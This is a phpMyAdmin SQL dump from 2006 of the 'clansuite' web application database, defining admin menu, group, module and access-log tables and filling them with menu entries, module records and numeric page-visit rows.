-- phpMyAdmin SQL Dump
-- version 2.8.1
-- http://www.phpmyadmin.net
-- 
-- Host: localhost
-- Erstellungszeit: 19. Juli 2006 um 06:08
-- Server Version: 5.0.21
-- PHP-Version: 5.1.4
-- 
-- Datenbank: `clansuite`
-- 

-- --------------------------------------------------------

-- 
-- Tabellenstruktur für Tabelle `cs_adminmenu`
-- 

CREATE TABLE `cs_adminmenu` (
  `id` tinyint(3) unsigned NOT NULL default '0',
  `parent` tinyint(3) unsigned NOT NULL default '0',
  `type` varchar(255) collate latin1_german1_ci NOT NULL default '',
  `text` varchar(255) collate latin1_german1_ci NOT NULL default '',
  `href` varchar(255) collate latin1_german1_ci NOT NULL default '',
  `title` varchar(255) collate latin1_german1_ci NOT NULL default '',
  `target` varchar(255) collate latin1_german1_ci NOT NULL default ''
) ENGINE=MyISAM DEFAULT CHARSET=latin1 COLLATE=latin1_german1_ci;

-- 
-- Daten für Tabelle `cs_adminmenu`
-- 

INSERT INTO `cs_adminmenu` VALUES (4, 0, 'button', 'System', '', 'System', '_self');
INSERT INTO `cs_adminmenu` VALUES (3, 0, 'button', 'Categories', 'admin/categories/index.php', 'Categories', '_self');
INSERT INTO `cs_adminmenu` VALUES (6, 0, 'button', 'Hilfe', '', 'Hilfe', '_self');
INSERT INTO `cs_adminmenu` VALUES (1, 0, 'button', 'Home', 'index.php', 'Home', '_self');
INSERT INTO `cs_adminmenu` VALUES (2, 0, 'button', 'Modules', '', 'Modules', '_self');
INSERT INTO `cs_adminmenu` VALUES (7, 6, 'item', 'Hilfe', 'help.php', 'Hilfe', '_self');
INSERT INTO `cs_adminmenu` VALUES (8, 6, 'item', 'Handbuch', 'manual.php', 'Handbuch', '_self');
INSERT INTO `cs_adminmenu` VALUES (5, 0, 'button', 'Users', 'admin/users/index.php', 'Users', '_self');
INSERT INTO `cs_adminmenu` VALUES (9, 6, 'item', 'Report Bug & Give Feedback', 'bugreport.php', 'Report Bug & Give Feedback', '_self');
INSERT INTO `cs_adminmenu` VALUES (10, 6, 'item', 'Über Clansuite', 'about.php', 'Über Clansuite', '_self');
INSERT INTO `cs_adminmenu` VALUES (11, 10, 'item', 'unter Clansuitel', 'test.php', 'unter Clansuite', '_self');
INSERT INTO `cs_adminmenu` VALUES (12, 6, 'item', 'test', '', 'test', '_self');
INSERT INTO `cs_adminmenu` VALUES (13, 4, 'item', 'Menüeditor', 'admin/menueditor.php', 'Menüeditor', '_self');
INSERT INTO `cs_adminmenu` VALUES (14, 4, 'item', 'Templateeditor', 'admin/templateeditor.php', 'TemplateEditor', '_self');
INSERT INTO `cs_adminmenu` VALUES (15, 2, 'item', 'Show all modules', '/index.php?mod=admin&sub=admin_modules&action=show_all', 'Show all modules', '_self');
INSERT INTO `cs_adminmenu` VALUES (16, 2, 'item', 'Install new modules', '/index.php?mod=admin&sub=admin_modules&action=install_new', 'Install new modules', '_self');
INSERT INTO `cs_adminmenu` VALUES (17, 2, 'item', 'Exports a module', '/index.php?mod=admin&sub=admin_modules&action=export', 'Exports a module', '_self');
INSERT INTO `cs_adminmenu` VALUES (18, 2, 'item', 'Imports a module', '/index.php?mod=admin&sub=admin_modules&action=import', 'Imports a module', '_self');
INSERT INTO `cs_adminmenu` VALUES (19, 2, 'item', 'Create a new module', '/index.php?mod=admin&sub=admin_modules&action=create_new', 'Create a new module', '_self');

-- --------------------------------------------------------

-- 
-- Tabellenstruktur für Tabelle `cs_groups`
-- 

CREATE TABLE `cs_groups` (
  `group_id` int(11) NOT NULL auto_increment,
  `name` varchar(255) collate latin1_general_ci NOT NULL,
  `description` text collate latin1_general_ci NOT NULL,
  `rights` text collate latin1_general_ci NOT NULL,
  `timestamp` int(11) NOT NULL,
  PRIMARY KEY  (`group_id`)
) ENGINE=MyISAM DEFAULT CHARSET=latin1 COLLATE=latin1_general_ci AUTO_INCREMENT=1 ;

-- 
-- Daten für Tabelle `cs_groups`
-- 


-- --------------------------------------------------------

-- 
-- Tabellenstruktur für Tabelle `cs_modules`
-- 

CREATE TABLE `cs_modules` (
  `module_id` int(11) NOT NULL auto_increment,
  `name` varchar(255) collate latin1_general_ci NOT NULL,
  `title` varchar(255) collate latin1_general_ci NOT NULL,
  `description` text collate latin1_general_ci NOT NULL,
  `class_name` varchar(255) collate latin1_general_ci NOT NULL,
  `file_name` varchar(255) collate latin1_general_ci NOT NULL,
  `folder_name` varchar(255) collate latin1_general_ci NOT NULL,
  `enabled` tinyint(1) NOT NULL,
  `image_name` varchar(255) collate latin1_general_ci NOT NULL,
  `version` float NOT NULL,
  `cs_version` float NOT NULL,
  PRIMARY KEY  (`module_id`),
  UNIQUE KEY `name` (`name`)
) ENGINE=MyISAM DEFAULT CHARSET=latin1 COLLATE=latin1_general_ci AUTO_INCREMENT=9 ;

-- 
-- Daten für Tabelle `cs_modules`
-- 

INSERT INTO `cs_modules` VALUES (1, 'index', 'Index Module', 'This is the main site.', 'module_index', 'index.class.php', 'index', 1, 'module_index.jpg', 0.1, 0.1);
INSERT INTO `cs_modules` VALUES (2, 'admin', 'Admin Interface', 'This is the Admin Control Panel', 'module_admin', 'admin.class.php', 'admin', 1, 'module_admin.jpg', 0.1, 0.1);
INSERT INTO `cs_modules` VALUES (3, 'account', 'Account Administration', 'This module handles all necessary account stuff - like login/logout etc.', 'module_account', 'account.class.php', 'account', 1, 'module_account.jpg', 0.1, 0.1);
INSERT INTO `cs_modules` VALUES (4, 'captcha', 'Captcha Module', 'The captcha module presents a image only humanoids can read.', 'module_captcha', 'captcha.class.php', 'captcha', 1, 'module_captcha.jpg', 0.1, 0.1);
INSERT INTO `cs_modules` VALUES (5, 'asdfffffffffffffffffffffff', 'asd34535', 'asd', 'module_asdfffffffffffffffffffffff', 'asdfffffffffffffffffffffff.class.php', 'asdfffffffffffffffffffffff', 0, 'module_asdfffffffffffffffffffffff.jpg', 0, 0);
INSERT INTO `cs_modules` VALUES (8, 'news', 'The website news', 'The website news', 'module_news', 'news.class.php', 'news', 0, 'module_news.jpg', 0, 0);

-- --------------------------------------------------------

-- 
-- Tabellenstruktur für Tabelle `cs_pot_accesslog`
-- 

CREATE TABLE `cs_pot_accesslog` (
  `accesslog_id` int(11) NOT NULL,
  `timestamp` int(10) unsigned NOT NULL,
  `weekday` tinyint(1) unsigned NOT NULL,
  `hour` tinyint(2) unsigned NOT NULL,
  `document_id` int(11) NOT NULL,
  `exit_target_id` int(11) NOT NULL default '0',
  `entry_document` tinyint(1) unsigned NOT NULL,
  KEY `accesslog_id` (`accesslog_id`),
  KEY `timestamp` (`timestamp`),
  KEY `document_id` (`document_id`),
  KEY `exit_target_id` (`exit_target_id`)
) ENGINE=MyISAM DEFAULT CHARSET=latin1 COLLATE=latin1_general_ci PACK_KEYS=1 DELAY_KEY_WRITE=1;

-- 
-- Daten für Tabelle `cs_pot_accesslog`
-- 

INSERT INTO `cs_pot_accesslog` VALUES (-1455101645, 1150833065, 2, 21, 2043925204, 0, 0);
INSERT INTO `cs_pot_accesslog` VALUES (-1455101645, 1150833083, 2, 21, 2043925204, 0, 0);
INSERT INTO `cs_pot_accesslog` VALUES (-1455101645, 1150833206, 2, 21, 2043925204, 0, 0);
INSERT INTO `cs_pot_accesslog` VALUES (-1455101645, 1150833263, 2, 21, 2043925204, 0, 0);
INSERT INTO `cs_pot_accesslog` VALUES (-1455101645, 1150833269, 2, 21, 2043925204, 0, 0);
INSERT INTO `cs_pot_accesslog` VALUES (-1455101645, 1150833487, 2, 21, 2043925204, 0, 0);
INSERT INTO `cs_pot_accesslog` VALUES (-1455101645, 1150833491, 2, 21, 2043925204, 0, 0);
INSERT INTO `cs_pot_accesslog` VALUES (-1455101645, 1150833521, 2, 21, 2043925204, 0, 0);
INSERT INTO `cs_pot_accesslog` VALUES (-1243081271, 1150833542, 2, 21, 2043925204, 0, 1);
INSERT INTO `cs_pot_accesslog` VALUES (12408568, 1150833555, 2, 21, 1740440180, 0, 1);
INSERT INTO `cs_pot_accesslog` VALUES (-1520139800, 1150833626, 2, 22, 1740440180, 0, 1);
INSERT INTO `cs_pot_accesslog` VALUES (1928790422, 1150834009, 2, 22, 1740440180, 0, 1);
INSERT INTO `cs_pot_accesslog` VALUES (-1920446340, 1150834029, 2, 22, 1740440180, 0, 1);
INSERT INTO `cs_pot_accesslog` VALUES (-1732572996, 1150834039, 2, 22, 1740440180, 0, 1);
INSERT INTO `cs_pot_accesslog` VALUES (162533754, 1150834122, 2, 22, 1740440180, 0, 1);
INSERT INTO `cs_pot_accesslog` VALUES (1749545857, 1150834126, 2, 22, 1740440180, 0, 1);
INSERT INTO `cs_pot_accesslog` VALUES (-874776070, 1150834149, 2, 22, 1740440180, 0, 1);
INSERT INTO `cs_pot_accesslog` VALUES (-1950232267, 1150834153, 2, 22, 1740440180, 0, 1);
INSERT INTO `cs_pot_accesslog` VALUES (-755034500, 1150834187, 2, 22, 1740440180, 0, 1);
INSERT INTO `cs_pot_accesslog` VALUES (-501265707, 1150834192, 2, 22, 1740440180, 0, 1);
INSERT INTO `cs_pot_accesslog` VALUES (-919561434, 1150834197, 2, 22, 1740440180, 0, 1);
INSERT INTO `cs_pot_accesslog` VALUES (-1228563005, 1150834248, 2, 22, 1740440180, 0, 1);
INSERT INTO `cs_pot_accesslog` VALUES (193828481, 1150834255, 2, 22, 1740440180, 0, 1);
INSERT INTO `cs_pot_accesslog` VALUES (1184916649, 1150834262, 2, 22, 1740440180, 0, 1);
INSERT INTO `cs_pot_accesslog` VALUES (1106751169, 1150834327, 2, 22, 1740440180, 0, 1);
INSERT INTO `cs_pot_accesslog` VALUES (-1781961268, 1150835652, 2, 22, 1740440180, 0, 1);
INSERT INTO `cs_pot_accesslog` VALUES (993125742, 1150835657, 2, 22, 1740440180, 0, 1);
INSERT INTO `cs_pot_accesslog` VALUES (-1314143067, 1150836687, 2, 22, 1740440180, 0, 1);
INSERT INTO `cs_pot_accesslog` VALUES (439515535, 1150836706, 2, 22, 1740440180, 0, 1);
INSERT INTO `cs_pot_accesslog` VALUES (1473693702, 1150839005, 2, 23, 1740440180, 0, 1);
INSERT INTO `cs_pot_accesslog` VALUES (-1215217233, 1150839007, 2, 23, 1740440180, 0, 1);
INSERT INTO `cs_pot_accesslog` VALUES (-412944080, 1150839032, 2, 23, 2043925204, 0, 1);
INSERT INTO `cs_pot_accesslog` VALUES (-1615518624, 1150839034, 2, 23, 1740440180, 0, 1);
INSERT INTO `cs_pot_accesslog` VALUES (1759625543, 1150839059, 2, 23, 1740440180, 0, 1);
INSERT INTO `cs_pot_accesslog` VALUES (1287846469, 1150839060, 2, 23, 1740440180, 0, 1);
INSERT INTO `cs_pot_accesslog` VALUES (1671020615, 1150839075, 2, 23, 1740440180, 0, 1);
INSERT INTO `cs_pot_accesslog` VALUES (1734871132, 1150839143, 2, 23, 1740440180, 0, 1);
INSERT INTO `cs_pot_accesslog` VALUES (1620213084, 1150839144, 2, 23, 1740440180, 0, 1);
INSERT INTO `cs_pot_accesslog` VALUES (-859813260, 1150839145, 2, 23, 1740440180, 0, 1);
INSERT INTO `cs_pot_accesslog` VALUES (-1099012849, 1150839146, 2, 23, 1740440180, 0, 1);
INSERT INTO `cs_pot_accesslog` VALUES (-309439034, 1150839146, 2, 23, 1740440180, 0, 1);
INSERT INTO `cs_pot_accesslog` VALUES (1033759086, 1150839147, 2, 23, 1740440180, 0, 1);
INSERT INTO `cs_pot_accesslog` VALUES (-741119799, 1150839154, 2, 23, 1740440180, 0, 1);
INSERT INTO `cs_pot_accesslog` VALUES (-1478662616, 1150839156, 2, 23, 1740440180, 0, 1);
INSERT INTO `cs_pot_accesslog` VALUES (60582802, 1150839181, 2, 23, 1740440180, 0, 1);
INSERT INTO `cs_pot_accesslog` VALUES (-1726310019, 1150839182, 2, 23, 1740440180, 0, 1);
INSERT INTO `cs_pot_accesslog` VALUES (1048069177, 1150839184, 2, 23, 1740440180, 0, 1);
INSERT INTO `cs_pot_accesslog` VALUES (1809198870, 1150839249, 2, 23, 1740440180, 0, 1);
INSERT INTO `cs_pot_accesslog` VALUES (545786925, 1150839252, 2, 23, 1740440180, 0, 1);
INSERT INTO `cs_pot_accesslog` VALUES (679924181, 1150839292, 2, 23, 1740440180, 0, 1);
INSERT INTO `cs_pot_accesslog` VALUES (8734048, 1150839294, 2, 23, 1740440180, 0, 1);
INSERT INTO `cs_pot_accesslog` VALUES (-1634035189, 1150839305, 2, 23, 1740440180, 0, 1);
INSERT INTO `cs_pot_accesslog` VALUES (-1568145014, 1150839306, 2, 23, 1740440180, 0, 1);
INSERT INTO `cs_pot_accesslog` VALUES (230036247, 1150839307, 2, 23, 1740440180, 0, 1);
INSERT INTO `cs_pot_accesslog` VALUES (236358818, 1150839307, 2, 23, 1740440180, 0, 1);
INSERT INTO `cs_pot_accesslog` VALUES (2135543803, 1150839346, 2, 23, 1740440180, 0, 1);
INSERT INTO `cs_pot_accesslog` VALUES (610223941, 1150839348, 2, 23, 1740440180, 0, 1);
INSERT INTO `cs_pot_accesslog` VALUES (-1720006863, 1150839350, 2, 23, 1740440180, 0, 1);
INSERT INTO `cs_pot_accesslog` VALUES (-1987385814, 1150839728, 2, 23, 1864550530, 0, 1);
INSERT INTO `cs_pot_accesslog` VALUES (-1606958556, 1150840329, 2, 23, 1740440180, 0, 1);
INSERT INTO `cs_pot_accesslog` VALUES (219713194, 1150840337, 2, 23, 1740440180, 0, 1);
INSERT INTO `cs_pot_accesslog` VALUES (1260940836, 1150840347, 2, 23, 1740440180, 0, 1);
INSERT INTO `cs_pot_accesslog` VALUES (1035387113, 1150840378, 2, 23, 1740440180, 0, 1);
INSERT INTO `cs_pot_accesslog` VALUES (1975881501, 1150840379, 2, 23, 1864550530, 0, 1);
INSERT INTO `cs_pot_accesslog` VALUES (-747130695, 1150840381, 2, 23, 1864550530, 0, 1);
INSERT INTO `cs_pot_accesslog` VALUES (-2136786174, 1150840687, 2, 23, 1864550530, 0, 1);
INSERT INTO `cs_pot_accesslog` VALUES (1368366203, 1150840701, 2, 23, 1864550530, 0, 1);
INSERT INTO `cs_pot_accesslog` VALUES (-617809359, 1150840703, 2, 23, 1864550530, 0, 1);
INSERT INTO `cs_pot_accesslog` VALUES (-1681801942, 1150840780, 2, 23, 1864550530, 0, 1);
INSERT INTO `cs_pot_accesslog` VALUES (59317581, 1150840782, 2, 23, 1864550530, 0, 1);
INSERT INTO `cs_pot_accesslog` VALUES (-436137533, 1150840783, 2, 23, 1864550530, 0, 1);
INSERT INTO `cs_pot_accesslog` VALUES (1817050296, 1150840812, 3, 0, 1864550530, 0, 1);
INSERT INTO `cs_pot_accesslog` VALUES (-1719966527, 1150840813, 3, 0, 1864550530, 0, 1);
INSERT INTO `cs_pot_accesslog` VALUES (-905368008, 1150840910, 3, 0, 1864550530, 0, 1);
INSERT INTO `cs_pot_accesslog` VALUES (-1836359025, 1150840913, 3, 0, 1864550530, 0, 1);
INSERT INTO `cs_pot_accesslog` VALUES (-1980967833, 1150840914, 3, 0, 1864550530, 0, 1);
INSERT INTO `cs_pot_accesslog` VALUES (1296476138, 1150840976, 3, 0, 1864550530, 0, 1);
INSERT INTO `cs_pot_accesslog` VALUES (1620389093, 1150840981, 3, 0, 1864550530, 0, 1);
INSERT INTO `cs_pot_accesslog` VALUES (-2069915482, 1150841292, 3, 0, 1864550530, 0, 1);
INSERT INTO `cs_pot_accesslog` VALUES (1235786517, 1150841449, 3, 0, 1864550530, 0, 1);
INSERT INTO `cs_pot_accesslog` VALUES (109597026, 1150841453, 3, 0, 1864550530, 0, 1);
INSERT INTO `cs_pot_accesslog` VALUES (-1488876200, 1150841458, 3, 0, 1864550530, 0, 1);
INSERT INTO `cs_pot_accesslog` VALUES (1475535991, 1150841461, 3, 0, 1864550530, 0, 1);
INSERT INTO `cs_pot_accesslog` VALUES (-828911075, 1150841466, 3, 0, 1864550530, 0, 1);
INSERT INTO `cs_pot_accesslog` VALUES (273364583, 1150841598, 3, 0, 1864550530, 0, 1);
INSERT INTO `cs_pot_accesslog` VALUES (-206093904, 1150841950, 3, 0, 1864550530, 0, 1);
INSERT INTO `cs_pot_accesslog` VALUES (169436560, 1150842016, 3, 0, 1864550530, 0, 1);
INSERT INTO `cs_pot_accesslog` VALUES (-1252393050, 1150842028, 3, 0, 1864550530, 0, 1);
INSERT INTO `cs_pot_accesslog` VALUES (1421765015, 1150842123, 3, 0, 1864550530, 0, 1);
INSERT INTO `cs_pot_accesslog` VALUES (-361630694, 1150842214, 3, 0, 1864550530, 0, 1);
INSERT INTO `cs_pot_accesslog` VALUES (-361630694, 1150842232, 3, 0, -45746190, 0, 0);
INSERT INTO `cs_pot_accesslog` VALUES (-361630694, 1150842236, 3, 0, 1864550530, 0, 0);
INSERT INTO `cs_pot_accesslog` VALUES (-361630694, 1150842237, 3, 0, -1749941107, 0, 0);
INSERT INTO `cs_pot_accesslog` VALUES (-361630694, 1150842239, 3, 0, 1864550530, 0, 0);
INSERT INTO `cs_pot_accesslog` VALUES (-361630694, 1150842465, 3, 0, 172387268, 0, 0);
INSERT INTO `cs_pot_accesslog` VALUES (-361630694, 1150842468, 3, 0, 1008761674, 0, 0);
INSERT INTO `cs_pot_accesslog` VALUES (1752161971, 1150842475, 3, 0, 2043925204, 0, 1);
INSERT INTO `cs_pot_accesslog` VALUES (-361630694, 1150845287, 3, 1, -1749941107, 0, 0);
INSERT INTO `cs_pot_accesslog` VALUES (-1830723705, 1150845293, 3, 1, 2043925204, 0, 1);
INSERT INTO `cs_pot_accesslog` VALUES (-1130060089, 1150845444, 3, 1, 2043925204, 0, 1);
INSERT INTO `cs_pot_accesslog` VALUES (264517879, 1150845568, 3, 1, 2043925204, 0, 1);
INSERT INTO `cs_pot_accesslog` VALUES (-802870882, 1150845579, 3, 1, 1526526107, 0, 1);
INSERT INTO `cs_pot_accesslog` VALUES (-802870882, 1150846833, 3, 1, 1864550530, 0, 0);
INSERT INTO `cs_pot_accesslog` VALUES (-802870882, 1150846835, 3, 1, -1749941107, 0, 0);
INSERT INTO `cs_pot_accesslog` VALUES (-802870882, 1150846836, 3, 1, 172387268, 0, 0);
INSERT INTO `cs_pot_accesslog` VALUES (-802870882, 1150846837, 3, 1, -45746190, 0, 0);
INSERT INTO `cs_pot_accesslog` VALUES (-802870882, 1150846837, 3, 1, 1008761674, 0, 0);
INSERT INTO `cs_pot_accesslog` VALUES (-802870882, 1150848780, 3, 2, 2043925204, 0, 0);
INSERT INTO `cs_pot_accesslog` VALUES (1934372970, 1150848791, 3, 2, 2043925204, 0, 1);
INSERT INTO `cs_pot_accesslog` VALUES (1040118740, 1150848793, 3, 2, 2043925204, 0, 1);
INSERT INTO `cs_pot_accesslog` VALUES (-745482243, 1150850476, 3, 2, 2043925204, 0, 1);
INSERT INTO `cs_pot_accesslog` VALUES (437653954, 1150857381, 3, 4, 1008761674, 0, 1);
INSERT INTO `cs_pot_accesslog` VALUES (437653954, 1150857405, 3, 4, -45746190, 0, 0);
INSERT INTO `cs_pot_accesslog` VALUES (-1395522779, 1150857421, 3, 4, 1204740461, 0, 1);
INSERT INTO `cs_pot_accesslog` VALUES (437653954, 1150859160, 3, 5, 1204740461, 0, 0);
INSERT INTO `cs_pot_accesslog` VALUES (786296169, 1150859839, 3, 5, 1204740461, 0, 1);
INSERT INTO `cs_pot_accesslog` VALUES (1492808778, 1150859844, 3, 5, 1204740461, 0, 1);
INSERT INTO `cs_pot_accesslog` VALUES (1665343570, 1150859849, 3, 5, 1204740461, 0, 1);
INSERT INTO `cs_pot_accesslog` VALUES (927262794, 1150859855, 3, 5, 1204740461, 0, 1);
INSERT INTO `cs_pot_accesslog` VALUES (1211736208, 1150859875, 3, 5, 1204740461, 0, 1);
INSERT INTO `cs_pot_accesslog` VALUES (-125526098, 1150859878, 3, 5, 1204740461, 0, 1);
INSERT INTO `cs_pot_accesslog` VALUES (601030263, 1150859882, 3, 5, 1204740461, 0, 1);
INSERT INTO `cs_pot_accesslog` VALUES (-621624809, 1150859921, 3, 5, 1204740461, 0, 1);
INSERT INTO `cs_pot_accesslog` VALUES (-621624809, 1150860735, 3, 5, 172387268, 0, 0);
INSERT INTO `cs_pot_accesslog` VALUES (-621624809, 1150860736, 3, 5, -1749941107, 0, 0);
INSERT INTO `cs_pot_accesslog` VALUES (-621624809, 1150860738, 3, 5, 1008761674, 0, 0);
INSERT INTO `cs_pot_accesslog` VALUES (-1188096948, 1150861119, 3, 5, 1390413028, 0, 1);
INSERT INTO `cs_pot_accesslog` VALUES (2091685137, 1150861122, 3, 5, 1390413028, 0, 1);
INSERT INTO `cs_pot_accesslog` VALUES (-997569942, 1150861125, 3, 5, 1390413028, 0, 1);
INSERT INTO `cs_pot_accesslog` VALUES (-1407189520, 1150861146, 3, 5, 1390413028, 0, 1);
INSERT INTO `cs_pot_accesslog` VALUES (-556642841, 1150861156, 3, 5, 1390413028, 0, 1);
INSERT INTO `cs_pot_accesslog` VALUES (264228182, 1150861162, 3, 5, 1390413028, 0, 1);
INSERT INTO `cs_pot_accesslog` VALUES (1471223858, 1150861167, 3, 5, 1390413028, 0, 1);
INSERT INTO `cs_pot_accesslog` VALUES (-2139007969, 1150861213, 3, 5, 1390413028, 0, 1);
INSERT INTO `cs_pot_accesslog` VALUES (585866094, 1150861311, 3, 5, 1390413028, 0, 1);
INSERT INTO `cs_pot_accesslog` VALUES (585866094, 1150861313, 3, 5, 172387268, 0, 0);
INSERT INTO `cs_pot_accesslog` VALUES (585866094, 1150861322, 3, 5, 1526526107, 0, 0);
INSERT INTO `cs_pot_accesslog` VALUES (585866094, 1150861323, 3, 5, -1749941107, 0, 0);
INSERT INTO `cs_pot_accesslog` VALUES (1064299594, 1150861356, 3, 5, 1390413028, 0, 1);
INSERT INTO `cs_pot_accesslog` VALUES (1064299594, 1150861371, 3, 5, 1526526107, 0, 0);
INSERT INTO `cs_pot_accesslog` VALUES (-1343008485, 1150863056, 3, 6, 1390413028, 0, 1);
INSERT INTO `cs_pot_accesslog` VALUES (-1343008485, 1150863062, 3, 6, 1526526107, 0, 0);
INSERT INTO `cs_pot_accesslog` VALUES (-1343008485, 1150863162, 3, 6, -45746190, 0, 0);
INSERT INTO `cs_pot_accesslog` VALUES (-1343008485, 1150863309, 3, 6, -1749941107, 0, 0);
INSERT INTO `cs_pot_accesslog` VALUES (-1343008485, 1150863613, 3, 6, -45746190, 0, 0);
INSERT INTO `cs_pot_accesslog` VALUES (-304208467, 1150863727, 3, 6, 1008761674, 0, 1);
INSERT INTO `cs_pot_accesslog` VALUES (1253256836, 1150863727, 3, 6, 1864550530, 0, 1);
INSERT INTO `cs_pot_accesslog` VALUES (-122968643, 1150863727, 3, 6, 1864550530, 0, 1);
INSERT INTO `cs_pot_accesslog` VALUES (-1000004898, 1150863728, 3, 6, 1864550530, 0, 1);
INSERT INTO `cs_pot_accesslog` VALUES (2071970912, 1150863728, 3, 6, 1864550530, 0, 1);
INSERT INTO `cs_pot_accesslog` VALUES (2092053855, 1150863728, 3, 6, 1864550530, 0, 1);
INSERT INTO `cs_pot_accesslog` VALUES (589304951, 1150863729, 3, 6, 1864550530, 0, 1);
INSERT INTO `cs_pot_accesslog` VALUES (-1375920613, 1150863729, 3, 6, 1864550530, 0, 1);
INSERT INTO `cs_pot_accesslog` VALUES (412607443, 1150863729, 3, 6, 1864550530, 0, 1);
INSERT INTO `cs_pot_accesslog` VALUES (1376116182, 1150863730, 3, 6, 1864550530, 0, 1);
INSERT INTO `cs_pot_accesslog` VALUES (-1897783115, 1150863730, 3, 6, 1864550530, 0, 1);
INSERT INTO `cs_pot_accesslog` VALUES (-23022525, 1150863730, 3, 6, 1864550530, 0, 1);
INSERT INTO `cs_pot_accesslog` VALUES (-1061965981, 1150863731, 3, 6, 1864550530, 0, 1);
INSERT INTO `cs_pot_accesslog` VALUES (-504332500, 1150863731, 3, 6, 1864550530, 0, 1);
INSERT INTO `cs_pot_accesslog` VALUES (-1973641702, 1150863731, 3, 6, 1864550530, 0, 1);
INSERT INTO `cs_pot_accesslog` VALUES (-824999684, 1150863732, 3, 6, 1864550530, 0, 1);
INSERT INTO `cs_pot_accesslog` VALUES (-509880572, 1150863732, 3, 6, 1864550530, 0, 1);
INSERT INTO `cs_pot_accesslog` VALUES (1191007782, 1150863732, 3, 6, 1864550530, 0, 1);
INSERT INTO `cs_pot_accesslog` VALUES (-640254447, 1150863733, 3, 6, 1864550530, 0, 1);
INSERT INTO `cs_pot_accesslog` VALUES (392611751, 1150863733, 3, 6, 1864550530, 0, 1);
INSERT INTO `cs_pot_accesslog` VALUES (1597997613, 1150863733, 3, 6, 1864550530, 0, 1);
INSERT INTO `cs_pot_accesslog` VALUES (-1918827868, 1150864074, 3, 6, -1749941107, 0, 1);
INSERT INTO `cs_pot_accesslog` VALUES (5231201, 1150864075, 3, 6, 1864550530, 0, 1);
INSERT INTO `cs_pot_accesslog` VALUES (100262669, 1150864075, 3, 6, 1864550530, 0, 1);
INSERT INTO `cs_pot_accesslog` VALUES (-1837511215, 1150864075, 3, 6, 1864550530, 0, 1);
INSERT INTO `cs_pot_accesslog` VALUES (-292230748, 1150864076, 3, 6, 1864550530, 0, 1);
INSERT INTO `cs_pot_accesslog` VALUES (1226424768, 1150864076, 3, 6, 1864550530, 0, 1);
INSERT INTO `cs_pot_accesslog` VALUES (1284195389, 1150864076, 3, 6, 1864550530, 0, 1);
INSERT INTO `cs_pot_accesslog` VALUES (-737518808, 1150864077, 3, 6, 1864550530, 0, 1);
INSERT INTO `cs_pot_accesslog` VALUES (806642551, 1150864077, 3, 6, 1864550530, 0, 1);
INSERT INTO `cs_pot_accesslog` VALUES (2106034926, 1150864077, 3, 6, 1864550530, 0, 1);
INSERT INTO `cs_pot_accesslog` VALUES (1694890130, 1150864078, 3, 6, 1864550530, 0, 1);
INSERT INTO `cs_pot_accesslog` VALUES (-864959897, 1150864078, 3, 6, 1864550530, 0, 1);
INSERT INTO `cs_pot_accesslog` VALUES (-425434127, 1150864078, 3, 6, 1864550530, 0, 1);
INSERT INTO `cs_pot_accesslog` VALUES (-252680118, 1150864078, 3, 6, 1864550530, 0, 1);
INSERT INTO `cs_pot_accesslog` VALUES (-1366325263, 1150864079, 3, 6, 1864550530, 0, 1);
INSERT INTO `cs_pot_accesslog` VALUES (-309244211, 1150864079, 3, 6, 1864550530, 0, 1);
INSERT INTO `cs_pot_accesslog` VALUES (1909065417, 1150864079, 3, 6, 1864550530, 0, 1);
INSERT INTO `cs_pot_accesslog` VALUES (17727941, 1150864080, 3, 6, 1864550530, 0, 1);
INSERT INTO `cs_pot_accesslog` VALUES (1988285315, 1150864080, 3, 6, 1864550530, 0, 1);
INSERT INTO `cs_pot_accesslog` VALUES (-1295013625, 1150864080, 3, 6, 1864550530, 0, 1);
INSERT INTO `cs_pot_accesslog` VALUES (709396784, 1150864081, 3, 6, 1864550530, 0, 1);
INSERT INTO `cs_pot_accesslog` VALUES (682257806, 1150864096, 3, 6, 1864550530, 0, 1);
INSERT INTO `cs_pot_accesslog` VALUES (-1845433808, 1150864096, 3, 6, 1864550530, 0, 1);
INSERT INTO `cs_pot_accesslog` VALUES (1903395744, 1150864097, 3, 6, 1864550530, 0, 1);
INSERT INTO `cs_pot_accesslog` VALUES (1802109659, 1150864097, 3, 6, 1864550530, 0, 1);
INSERT INTO `cs_pot_accesslog` VALUES (1098896906, 1150864097, 3, 6, 1864550530, 0, 1);
INSERT INTO `cs_pot_accesslog` VALUES (1364928085, 1150864098, 3, 6, 1864550530, 0, 1);
INSERT INTO `cs_pot_accesslog` VALUES (699864734, 1150864098, 3, 6, 1864550530, 0, 1);
INSERT INTO `cs_pot_accesslog` VALUES (2003997468, 1150864098, 3, 6, 1864550530, 0, 1);
INSERT INTO `cs_pot_accesslog` VALUES (-1381186023, 1150864099, 3, 6, 1864550530, 0, 1);
INSERT INTO `cs_pot_accesslog` VALUES (1228238072, 1150864099, 3, 6, 1864550530, 0, 1);
INSERT INTO `cs_pot_accesslog` VALUES (-709412386, 1150864099, 3, 6, 1864550530, 0, 1);
INSERT INTO `cs_pot_accesslog` VALUES (1596595681, 1150864099, 3, 6, 1864550530, 0, 1);
INSERT INTO `cs_pot_accesslog` VALUES (1588799942, 1150864100, 3, 6, 1864550530, 0, 1);
INSERT INTO `cs_pot_accesslog` VALUES (-390959097, 1150864100, 3, 6, 1864550530, 0, 1);
INSERT INTO `cs_pot_accesslog` VALUES (1362460925, 1150864100, 3, 6, 1864550530, 0, 1);
INSERT INTO `cs_pot_accesslog` VALUES (-1956425781, 1150864377, 3, 6, 1864550530, 0, 1);
INSERT INTO `cs_pot_accesslog` VALUES (-1343008485, 1150864387, 3, 6, 1864550530, 0, 0);
INSERT INTO `cs_pot_accesslog` VALUES (-1343008485, 1150864461, 3, 6, 172387268, 0, 0);
INSERT INTO `cs_pot_accesslog` VALUES (1622576286, 1150864477, 3, 6, 1008761674, 0, 1);
INSERT INTO `cs_pot_accesslog` VALUES (255325382, 1150864595, 3, 6, 1008761674, 0, 1);
INSERT INTO `cs_pot_accesslog` VALUES (2141347083, 1150864630, 3, 6, 172387268, 0, 1);
INSERT INTO `cs_pot_accesslog` VALUES (2035532204, 1150864632, 3, 6, 1526526107, 0, 1);
INSERT INTO `cs_pot_accesslog` VALUES (-547291663, 1150864694, 3, 6, 1526526107, 0, 1);
INSERT INTO `cs_pot_accesslog` VALUES (535445220, 1150864698, 3, 6, 172387268, 0, 1);
INSERT INTO `cs_pot_accesslog` VALUES (-616106989, 1150864749, 3, 6, 172387268, 0, 1);
INSERT INTO `cs_pot_accesslog` VALUES (1039962814, 1150864751, 3, 6, 1864550530, 0, 1);
